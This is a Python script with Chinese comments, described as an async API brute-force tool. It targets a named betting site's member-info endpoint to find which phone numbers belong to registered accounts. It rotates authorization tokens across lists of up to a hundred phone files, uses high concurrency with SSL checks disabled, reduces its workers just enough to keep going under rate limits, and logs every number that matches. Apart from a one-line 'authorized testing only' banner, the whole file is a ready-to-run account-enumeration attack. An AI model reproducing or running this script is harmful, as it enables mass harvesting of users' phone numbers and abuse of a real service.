#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
异步自定义API爆破工具
支持HTTP/2请求，循环匹配字典，断点续跑，响应解析等功能
"""

import json
import time
import asyncio
import aiohttp
import os
import threading  # 添加线程锁支持
from datetime import datetime
import argparse
import gzip
from io import BytesIO
from aiohttp import ClientSession, TCPConnector

# 禁用SSL警告（简化处理）
try:
    # 尝试不同的方式禁用SSL警告
    import warnings
    warnings.filterwarnings('ignore', module='urllib3')
except:
    pass

class AsyncCustomBruteforcer:
    def __init__(self, pload1_file, output_file=None, processed_file=None, max_workers=50, request_delay=0.0, batch_delay=0.5, batch_size=2000):
        # 字典文件
        self.pload1_file = pload1_file
        
        # 输出文件
        self.output_file = output_file or f"duplicated_mobiles_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.processed_file = processed_file or "processed_phones.txt"
        
        # 线程数和请求延迟
        self.max_workers = max_workers
        self.request_delay = request_delay
        self.batch_delay = batch_delay
        self.batch_size = batch_size
        
        # 自动调节线程相关
        self.consecutive_too_many_errors = 0  # 连续TOO_MANY_REQUEST计数
        self.max_consecutive_too_many = 5     # 连续5个TOO_MANY_REQUEST时降低线程
        self.too_many_requests_keyword = "TOO_MANY_REQUEST"  # 限流关键字
        
        # 自定义请求配置
        self.custom_url = "https://www.789taya.ph/wps/member/info"
        self.custom_headers = {
            'Host': 'www.789taya.ph',
            'Cookie': 'SHELL_deviceId=03171d60-9992-4496-8b88-fcfdbb97b24c',
            'Content-Length': '24',
            'Language': 'EN',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Authorization': 'pload1',
            'Sec-Ch-Ua': '"Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'X-Timestamp': str(int(time.time() * 1000)),
            'Sec-Ch-Ua-Mobile': '?0',
            'Merchant': '789tatlbf5',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json',
            'X-Gateway-Version': '1',
            'Origin': 'https://www.789taya.ph',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.789taya.ph/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
            'Priority': 'u=1, i'
        }
        self.custom_data_template = '{"mobile":"pload2"}'
        
        # 统计信息
        self.total_requests = 0
        self.success_count = 0
        self.duplicated_count = 0
        self.errors = 0
        self.start_time = None
        
        # 线程锁（用于异步环境中的线程安全）
        self.lock = asyncio.Lock()
        
        # 已处理的手机号集合
        self.processed_phones = set()
        
        # 加载已处理的手机号
        self.load_processed_phones()
    
    def parse_custom_request(self, request_text):
        """解析自定义请求包"""
        try:
            # 分割请求头和请求体
            parts = request_text.split('\n\n', 1)
            if len(parts) < 2:
                parts = request_text.split('\r\n\r\n', 1)
            
            if len(parts) < 2:
                raise ValueError("请求包格式不正确，缺少请求头和请求体的分隔")
            
            header_part = parts[0].strip()
            body_part = parts[1].strip()
            
            # 解析请求行
            request_lines = header_part.split('\n')
            if not request_lines:
                raise ValueError("无效的请求格式")
            
            request_line = request_lines[0].strip()
            method, path, protocol = request_line.split(' ', 2)
            
            # 提取Host头作为基础URL
            host = "localhost"
            for line in request_lines[1:]:
                if line.lower().startswith('host:'):
                    host = line[5:].strip()
                    break
            
            # 构建完整URL
            if not path.startswith('/'):
                path = '/' + path
            self.custom_url = f"https://{host}{path}"
            
            # 解析请求头
            self.custom_headers = {}
            for line in request_lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    self.custom_headers[key.strip()] = value.strip()
            
            # 保存请求体模板（pload2将替换其中的占位符）
            self.custom_data_template = body_part
            
            print(f"✓ 成功解析自定义请求包")
            print(f"URL: {self.custom_url}")
            print(f"请求头数量: {len(self.custom_headers)}")
            return True
            
        except Exception as e:
            print(f"❌ 解析自定义请求包失败: {e}")
            return False
    
    def load_processed_phones(self):
        """加载已处理的手机号"""
        if os.path.exists(self.processed_file):
            try:
                with open(self.processed_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        phone = line.strip()
                        if phone:
                            self.processed_phones.add(phone)
                print(f"✓ 已加载 {len(self.processed_phones)} 个已处理的手机号")
            except Exception as e:
                print(f"⚠️ 加载已处理手机号文件失败: {e}")
    
    def save_processed_phone(self, phone):
        """保存已处理的手机号"""
        try:
            with open(self.processed_file, 'a', encoding='utf-8') as f:
                f.write(f"{phone}\n")
            self.processed_phones.add(phone)
        except Exception as e:
            print(f"❌ 保存已处理手机号失败: {e}")
    
    def load_pload1(self):
        """加载PLOAD1数据"""
        print("加载PLOAD1数据...")
        try:
            with open(self.pload1_file, 'r', encoding='utf-8') as f:
                pload1_list = [line.strip() for line in f if line.strip()]
            print(f"✓ 成功加载 {len(pload1_list)} 个PLOAD1")
            return pload1_list
        except FileNotFoundError:
            print(f"错误: 找不到文件 {self.pload1_file}")
            return []
        except Exception as e:
            print(f"错误: 加载PLOAD1失败 - {e}")
            return []
    
    def load_phone_file(self, phone_file):
        """加载单个手机号文件"""
        phones = []
        if os.path.exists(phone_file):
            try:
                with open(phone_file, 'r', encoding='utf-8') as f:
                    phones = [line.strip() for line in f if line.strip()]
                print(f"✓ 成功加载 {len(phones)} 个手机号从 {phone_file}")
            except Exception as e:
                print(f"❌ 加载 {phone_file} 失败: {e}")
        else:
            print(f"⚠️  文件不存在: {phone_file}")
        return phones
    
    def filter_remaining_phones(self, phone_list, processed_phones_set, batch_size=100000):
        """分批过滤剩余手机号，避免内存问题"""
        remaining_phones = []
        total_checked = 0
        
        # 分批处理以避免内存问题
        for i in range(0, len(phone_list), batch_size):
            batch = phone_list[i:i+batch_size]
            batch_remaining = [phone for phone in batch if phone not in processed_phones_set]
            remaining_phones.extend(batch_remaining)
            total_checked += len(batch)
            
            # 每处理一定数量显示进度
            if total_checked % (batch_size * 10) == 0:
                print(f"🔍 已检查 {total_checked:,} 个手机号，找到 {len(remaining_phones):,} 个待处理")
        
        return remaining_phones
    
    def find_next_phone_file(self, start_index=1):
        """查找下一个存在的phone文件"""
        print(f"🔎 查找下一个phone文件，起始索引: {start_index}")
        # 检查连续数字文件（phone1.txt, phone2.txt, ..., phone100.txt等）
        for i in range(start_index, 101):  # 检查到phone100.txt
            filename = f"phone{i}.txt"
            if os.path.exists(filename):
                print(f"✅ 找到文件: {filename} (索引 {i})")
                return filename, i
            else:
                print(f"❌ 文件不存在: {filename}")
        
        print("🔚 没有找到更多文件")
        return None, -1
    
    async def make_async_request(self, session, pload1, phone):
        """发送单个异步请求"""
        # 使用自定义请求配置
        headers = self.custom_headers.copy()
        
        # 替换Authorization头中的pload1占位符
        for key, value in headers.items():
            if 'pload1' in value:
                headers[key] = value.replace('pload1', pload1)
        
        # 替换请求体中的pload2占位符
        data_str = self.custom_data_template.replace('pload2', phone)
        
        # 尝试解析为JSON，如果失败则保持为字符串
        try:
            data = json.loads(data_str)
        except json.JSONDecodeError:
            # 如果不是有效的JSON，直接使用字符串
            data = data_str
        except Exception:
            # 其他异常也使用字符串
            data = data_str
        
        # 特殊处理JSON数据，确保正确发送
        if isinstance(data, dict):
            # 对于字典类型，手动构建JSON字符串以确保格式正确
            json_data = json.dumps(data)
            # 更新请求头，移除旧的Content-Length并设置正确的Content-Type
            updated_headers = headers.copy()
            updated_headers['Content-Type'] = 'application/json'
            # 移除Content-Length，让aiohttp自动计算
            updated_headers.pop('Content-Length', None)
            post_kwargs = {
                'data': json_data,
                'headers': updated_headers
            }
        else:
            # 对于字符串或其他类型，直接发送
            # 移除Content-Length，让aiohttp自动计算
            updated_headers = headers.copy()
            updated_headers.pop('Content-Length', None)
            post_kwargs = {
                'data': data if not isinstance(data, dict) else None,
                'headers': updated_headers
            }
        
        try:
            # 异步发送请求
            async with session.post(
                self.custom_url,
                timeout=aiohttp.ClientTimeout(total=10),
                **post_kwargs
            ) as response:
                # 先读取原始响应内容
                raw_content = await response.read()
                
                # 处理压缩的响应
                content_encoding = response.headers.get('Content-Encoding', '').lower()
                if content_encoding == 'gzip':
                    try:
                        # 尝试解压gzip响应
                        import gzip
                        from io import BytesIO
                        buf = BytesIO(raw_content)
                        gzip_file = gzip.GzipFile(fileobj=buf)
                        response_text = gzip_file.read().decode('utf-8')
                    except Exception as e:
                        # 如果解压失败，尝试直接解码
                        try:
                            response_text = raw_content.decode('utf-8')
                        except:
                            response_text = str(raw_content)
                elif content_encoding == 'br':
                    try:
                        # 尝试解压brotli响应
                        import brotli
                        response_text = brotli.decompress(raw_content).decode('utf-8')
                    except ImportError:
                        # 如果没有安装brotli库，记录错误并尝试直接解码
                        print(f"[WARNING] 未安装Brotli库，无法解压br压缩的响应")
                        try:
                            response_text = raw_content.decode('utf-8')
                        except:
                            response_text = str(raw_content)
                    except Exception as e:
                        # 如果解压失败，尝试直接解码
                        try:
                            response_text = raw_content.decode('utf-8')
                        except:
                            response_text = str(raw_content)
                else:
                    # 非压缩响应
                    try:
                        response_text = raw_content.decode('utf-8')
                    except:
                        response_text = str(raw_content)
                
                result = {
                    'pload1': pload1,
                    'phone': phone,
                    'status_code': response.status,
                    'response_text': response_text,
                    'error': False
                }
                
                # 输出响应包用于调试（仅在调试模式下）
                if os.environ.get('DEBUG_ASYNC_BRUTEFORCER'):
                    print(f"\n[DEBUG] 手机号: {phone}")
                    print(f"[DEBUG] 状态码: {response.status}")
                    print(f"[DEBUG] 响应头: {dict(response.headers)}")
                    # 显示实际发送的数据
                    if isinstance(data, dict):
                        print(f"[DEBUG] 请求数据: data={json.dumps(data)}, headers包含Content-Type: application/json")
                    else:
                        print(f"[DEBUG] 请求数据: data={data}")
                    print(f"[DEBUG] 响应内容: {response_text[:500]}...")
                    # 检查是否包含目标字段
                    if "customer_mobile_no_duplicated" in response_text:
                        print(f"[DEBUG] ⚠️ 响应包含 customer_mobile_no_duplicated 字段！")
                    
        except Exception as e:
            result = {
                'pload1': pload1,
                'phone': phone,
                'status_code': -1,
                'response_text': str(e),
                'error': True
            }
            
            # 输出错误信息用于调试（仅在调试模式下）
            if os.environ.get('DEBUG_ASYNC_BRUTEFORCER'):
                print(f"\n[DEBUG] 手机号: {phone}")
                print(f"[DEBUG] 错误: {str(e)}")
                # 显示实际发送的数据
                if isinstance(data, dict):
                    print(f"[DEBUG] 请求数据: data={json.dumps(data)}, headers包含Content-Type: application/json")
                else:
                    print(f"[DEBUG] 请求数据: data={data}")
        
        return result
    
    def check_duplicated_mobile(self, response_text):
        """检查是否包含重复手机号的响应"""
        return "customer_mobile_no_duplicated" in response_text
    
    def log_duplicated_mobile(self, phone):
        """记录重复的手机号"""
        try:
            with open(self.output_file, 'a', encoding='utf-8') as f:
                f.write(f"{phone}\n")
            print(f"🎯 发现重复手机号: {phone}")
        except Exception as e:
            print(f"❌ 记录重复手机号失败: {e}")
    
    def check_rate_limit(self, status_code, response_text):
        """检查是否触发限流"""
        # 检查是否包含TOO_MANY_REQUEST字段（不限状态码）
        if self.too_many_requests_keyword in response_text:
            self.consecutive_too_many_errors += 1
            print(f"\n⚠️ 检测到TOO_MANY_REQUEST ({self.consecutive_too_many_errors}/{self.max_consecutive_too_many})")
            print(f"当前线程数: {self.max_workers}")
            
            # 连续5个TOO_MANY_REQUEST时降低线程数
            if self.consecutive_too_many_errors >= self.max_consecutive_too_many:
                if self.max_workers > 1:  # 确保至少有1个线程
                    old_workers = self.max_workers
                    self.max_workers -= 1
                    print(f"\n🚨 检测到连续{self.consecutive_too_many_errors}个TOO_MANY_REQUEST，自动降低线程数: {old_workers} -> {self.max_workers}")
                    # 重置计数器
                    self.consecutive_too_many_errors = 0
                    # 暂停一段时间让服务器恢复
                    time.sleep(2)
                    print(f"当前线程数: {self.max_workers}")
        else:
            # 重置计数器
            if self.consecutive_too_many_errors > 0:
                print(f"\n✅ 恢复正常响应，重置TOO_MANY_REQUEST计数器: {self.consecutive_too_many_errors} -> 0")
                self.consecutive_too_many_errors = 0
    
    async def log_result(self, result):
        """记录结果"""
        # 在异步环境中使用异步锁
        async with self.lock:
            self.total_requests += 1
            
            # 检查限流情况
            self.check_rate_limit(result['status_code'], result['response_text'])
            
            # 保存已处理的手机号
            self.save_processed_phone(result['phone'])
            
            # 检查是否为重复手机号
            if not result['error'] and self.check_duplicated_mobile(result['response_text']):
                self.duplicated_count += 1
                self.log_duplicated_mobile(result['phone'])
                # 增加强调提示
                print(f"\n\n" + "="*60)
                print(f"🎯 🎯 🎯 找到目标：{result['phone']} 🎯 🎯 🎯")
                print(f"  响应内容：{result['response_text'][:200]}...")
                print("="*60 + "\n\n")
            
            # 统计成功请求
            if result['status_code'] == 200:
                self.success_count += 1
            
            if result['error']:
                self.errors += 1
    
    async def print_progress(self):
        """打印进度"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            rate = self.total_requests / elapsed if elapsed > 0 else 0
            
            print(f"\r进度: {self.total_requests:,} 请求 | "
                  f"成功: {self.success_count} | "
                  f"重复手机号: {self.duplicated_count} | "
                  f"错误: {self.errors} | "
                  f"线程数: {self.max_workers} | "
                  f"速度: {rate:.2f} req/s", end='', flush=True)
    
    async def async_worker_task(self, session, pload1_list, phone):
        """异步工作单个任务"""
        if phone in self.processed_phones:
            return None
            
        # 循环使用pload1，保持与同步版本一致的逻辑
        # 获取手机号在批次中的索引
        pload1 = pload1_list[len([p for p in self.processed_phones if p == phone]) % len(pload1_list)]
        
        result = await self.make_async_request(session, pload1, phone)
        
        # 异步记录结果
        await self.log_result(result)
        
        # 添加请求延迟（默认为0，提高速度）
        if self.request_delay > 0:
            await asyncio.sleep(self.request_delay)
        
        # 定期更新进度（每5个请求更新一次，提高效率）
        if self.total_requests % 5 == 0:
            await self.print_progress()
        
        return result
    
    async def run_bruteforce_async(self):
        """异步运行爆破 - 修改为顺序处理phone文件，每次只加载一个文件"""
        print("=" * 60)
        print("           异步自定义API爆破工具")
        print("=" * 60)
        
        # 加载PLOAD1
        pload1_list = self.load_pload1()
        if not pload1_list:
            print("❌ 无法加载PLOAD1，退出")
            return
        
        # 询问用户是否要使用自定义请求包
        use_custom = input("\n是否要使用自定义请求包? (y/N): ").strip().lower()
        if use_custom == 'y':
            print("\n请输入自定义请求包 (输入完成后请按回车键两次):")
            print("示例格式:")
            print("POST /wps/member/info HTTP/2")
            print("Host: www.fb77.love")
            print("Authorization: pload1")
            print("...")
            print()
            print('{"mobile":"pload2"}')
            print("\n" + "="*50)
            
            # 读取多行输入直到遇到空行
            custom_request_lines = []
            while True:
                try:
                    line = input()
                    if line == "" and custom_request_lines and custom_request_lines[-1] == "":
                        # 连续两个空行表示输入结束
                        break
                    custom_request_lines.append(line)
                except KeyboardInterrupt:
                    print("\n❌ 取消输入")
                    return
            
            # 移除最后的空行（表示结束的空行）
            if custom_request_lines and custom_request_lines[-1] == "":
                custom_request_lines.pop()
            
            custom_request = "\n".join(custom_request_lines)
            
            # 解析自定义请求包
            if not self.parse_custom_request(custom_request):
                print("❌ 自定义请求包解析失败，使用默认配置")
            else:
                print("✓ 使用自定义请求包配置")
        
        # 确认开始
        confirm = input("\n确认开始爆破? (y/N): ").strip().lower()
        if confirm != 'y':
            print("❌ 取消爆破")
            return
        
        self.start_time = time.time()
        print(f"\n开始爆破... {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # 顺序处理phone文件，从phone1.txt开始到phone100.txt
        current_phone_index = 1
        processed_files_count = 0
        max_attempts = 100  # 防止无限循环
        attempt_count = 0
        
        print(f"🔍 开始处理phone文件，起始索引: {current_phone_index}")
        
        while attempt_count < max_attempts:
            attempt_count += 1
            print(f"\n🔍 主循环第 {attempt_count} 次尝试，当前索引: {current_phone_index}")
            
            # 查找下一个存在的phone文件
            phone_file, file_index = self.find_next_phone_file(current_phone_index)
            print(f"🔍 查找结果: phone_file={phone_file}, file_index={file_index}")
            
            # 如果没有找到文件或超出范围，结束循环
            if not phone_file or file_index == -1 or file_index > 100 or file_index < current_phone_index:
                print("✅ 所有手机号文件已处理完毕或超出范围")
                break
                
            print(f"\n📱 正在处理文件: {phone_file} (索引: {file_index})")
            
            # 加载当前手机号文件
            phone_list = self.load_phone_file(phone_file)
            if not phone_list:
                print(f"❌ 无法加载 {phone_file}，跳过到下一个文件")
                current_phone_index = file_index + 1
                print(f"➡️  更新索引到: {current_phone_index}")
                continue
            
            # 优化：分批过滤已处理的手机号，避免内存问题
            print(f"📊 {phone_file} 总数: {len(phone_list):,}，开始过滤已处理的手机号...")
            remaining_phones = self.filter_remaining_phones(phone_list, self.processed_phones)
            print(f"📊 过滤完成: {phone_file} 剩余待处理: {len(remaining_phones):,}")
            
            if not remaining_phones:
                print(f"✅ {phone_file} 中的所有手机号已处理完毕")
                current_phone_index = file_index + 1
                processed_files_count += 1
                print(f"➡️  文件处理完成后更新索引到: {current_phone_index}")
                print(f"📈 当前已处理文件数: {processed_files_count}")
                continue
            
            print(f"🔑 PLOAD1数量: {len(pload1_list)}")
            print(f"📱 {phone_file} 手机号总数: {len(phone_list):,}")
            print(f"✅ 已处理手机号: {len(phone_list) - len(remaining_phones):,}")
            print(f"⏳ 待处理手机号: {len(remaining_phones):,}")
            print(f"🧵 初始线程数: {self.max_workers}")
            print(f"⏱️  请求延迟: {self.request_delay}秒")
            print(f"📊 批次大小: {self.batch_size}")
            print(f"🕒 批次延迟: {self.batch_delay}秒")
            print(f"📄 重复手机号将保存到: {self.output_file}")
            print(f"📝 已处理手机号将保存到: {self.processed_file}")
            
            # 创建连接池
            connector = TCPConnector(limit=self.max_workers, verify_ssl=False)
            timeout = aiohttp.ClientTimeout(total=10)
            
            # 分批处理手机号以控制内存使用
            async with ClientSession(connector=connector, timeout=timeout) as session:
                for i in range(0, len(remaining_phones), self.batch_size):
                    batch = remaining_phones[i:i+self.batch_size]
                    print(f"\n处理批次 {i//self.batch_size + 1} (手机号 {i+1:,} - {min(i+len(batch), len(remaining_phones)):,})")
                    
                    # 使用信号量控制并发数
                    semaphore = asyncio.Semaphore(self.max_workers)
                    
                    # 创建并发限制的任务
                    async def run_task_with_semaphore(pload1, phone):
                        try:
                            async with semaphore:
                                if phone in self.processed_phones:
                                    return None
                                return await self.async_worker_task_wrapper(session, pload1, phone)
                        except asyncio.CancelledError:
                            # 任务被取消时正常退出
                            return None
                        except Exception as e:
                            # 捕获其他异常，避免任务崩溃
                            print(f"\n⚠️ 处理手机号 {phone} 时出错: {e}")
                            import traceback
                            if os.environ.get('DEBUG_ASYNC_BRUTEFORCER'):
                                traceback.print_exc()
                            return None
                    
                    # 创建任务列表
                    tasks = []
                    for j, phone in enumerate(batch):
                        # 循环使用pload1，保持与同步版本一致的逻辑
                        pload1 = pload1_list[j % len(pload1_list)]
                        task = asyncio.create_task(run_task_with_semaphore(pload1, phone))
                        tasks.append(task)
                    
                    # 等待当前批次完成
                    try:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        # 检查是否有异常
                        for idx, result in enumerate(results):
                            if isinstance(result, Exception) and not isinstance(result, asyncio.CancelledError):
                                print(f"\n⚠️ 任务 {idx} 执行异常: {result}")
                    except asyncio.CancelledError:
                        # 如果批次被取消，取消所有未完成的任务
                        print(f"\n⚠️ 批次被取消，正在清理任务...")
                        for task in tasks:
                            if not task.done():
                                task.cancel()
                        # 等待所有任务完成清理
                        await asyncio.gather(*tasks, return_exceptions=True)
                        raise
                    except Exception as e:
                        print(f"\n❌ 异步任务执行出错: {e}")
                        # 确保所有任务都被取消
                        for task in tasks:
                            if not task.done():
                                task.cancel()
                        # 等待所有任务完成清理
                        await asyncio.gather(*tasks, return_exceptions=True)
                    finally:
                        # 确保所有任务都已完成或取消
                        await asyncio.sleep(0.1)
                    
                    # 批次间休息（默认0.5秒，可调整）
                    if i + self.batch_size < len(remaining_phones):
                        print(f"\n⏳ 批次完成，休息{self.batch_delay}秒...")
                        await asyncio.sleep(self.batch_delay)
            
            print(f"\n✅ {phone_file} 处理完成，所有手机号已爆破完")
            current_phone_index = file_index + 1
            processed_files_count += 1
            print(f"➡️  文件处理完成后更新索引到: {current_phone_index}")
            print(f"📈 当前已处理文件数: {processed_files_count}")
            
            # 添加额外的安全检查，确保索引正确递增
            if current_phone_index <= file_index:
                current_phone_index = file_index + 1
                print(f"🔧 安全检查更新索引到: {current_phone_index}")
        
        # 完成统计
        total_time = time.time() - self.start_time if self.start_time else 0
        avg_rate = self.total_requests / total_time if total_time > 0 else 0
        
        print(f"\n\n✅ 所有手机号文件爆破完成!")
        print("=" * 40)
        print(f"总处理文件数: {processed_files_count}")
        print(f"总请求数: {self.total_requests:,}")
        print(f"成功响应(200): {self.success_count}")
        print(f"重复手机号: {self.duplicated_count}")
        print(f"错误请求: {self.errors}")
        print(f"最终线程数: {self.max_workers}")
        print(f"总耗时: {total_time:.2f} 秒")
        print(f"平均速度: {avg_rate:.2f} req/s")
        print(f"重复手机号保存在: {self.output_file}")
        print("=" * 40)
    
    async def async_worker_task_wrapper(self, session, pload1, phone):
        """异步工作单个任务包装器"""
        try:
            if phone in self.processed_phones:
                return None
                
            result = await self.make_async_request(session, pload1, phone)
            
            # 异步记录结果
            await self.log_result(result)
            
            # 添加请求延迟（默认为0，提高速度）
            if self.request_delay > 0:
                await asyncio.sleep(self.request_delay)
            
            # 定期更新进度（每5个请求更新一次，提高效率）
            if self.total_requests % 5 == 0:
                await self.print_progress()
            
            return result
        except asyncio.CancelledError:
            # 任务被取消时正常退出
            return None
        except Exception as e:
            # 捕获异常，避免任务崩溃
            print(f"\n⚠️ 处理请求时出错 (手机号: {phone}): {e}")
            return None

async def async_main():
    """异步主函数"""
    parser = argparse.ArgumentParser(description='异步自定义API爆破工具')
    parser.add_argument('-t', '--threads', type=int, default=50, help='并发数 (默认: 50)')
    parser.add_argument('-d', '--delay', type=float, default=0.0, help='请求延迟(秒) (默认: 0.0)')
    parser.add_argument('-b', '--batch-size', type=int, default=2000, help='批次大小 (默认: 2000)')
    parser.add_argument('--batch-delay', type=float, default=0.5, help='批次间延迟(秒) (默认: 0.5)')
    parser.add_argument('-o', '--output', type=str, help='重复手机号输出文件名')
    parser.add_argument('--pload1', type=str, default='pload1_tokens.txt', help='PLOAD1文件 (默认: pload1_tokens.txt)')
    parser.add_argument('--processed', type=str, help='已处理手机号记录文件')
    
    args = parser.parse_args()
    
    print("异步自定义API爆破工具")
    print("注意: 此工具仅用于授权的安全测试")
    print()
    
    # 创建爆破器
    bruteforcer = AsyncCustomBruteforcer(
        pload1_file=args.pload1,
        output_file=args.output,
        processed_file=args.processed,
        max_workers=args.threads,
        request_delay=args.delay,
        batch_delay=args.batch_delay,
        batch_size=args.batch_size
    )
    
    # 开始异步爆破
    try:
        await bruteforcer.run_bruteforce_async()
    except KeyboardInterrupt:
        print("\n\n⏹️ 用户中断爆破")
        # 给一点时间让任务清理
        await asyncio.sleep(0.5)
    except Exception as e:
        print(f"\n💥 爆破过程出错: {e}")
        import traceback
        traceback.print_exc()
        # 给一点时间让任务清理
        await asyncio.sleep(0.5)
    finally:
        # 确保所有任务都已完成
        pending = asyncio.all_tasks()
        current_task = asyncio.current_task()
        pending.discard(current_task)
        if pending:
            print(f"\n🔄 清理 {len(pending)} 个待处理任务...")
            for task in pending:
                task.cancel()
            # 等待所有任务完成清理
            await asyncio.gather(*pending, return_exceptions=True)

if __name__ == "__main__":
    # 处理Windows系统下的事件循环问题
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    asyncio.run(async_main())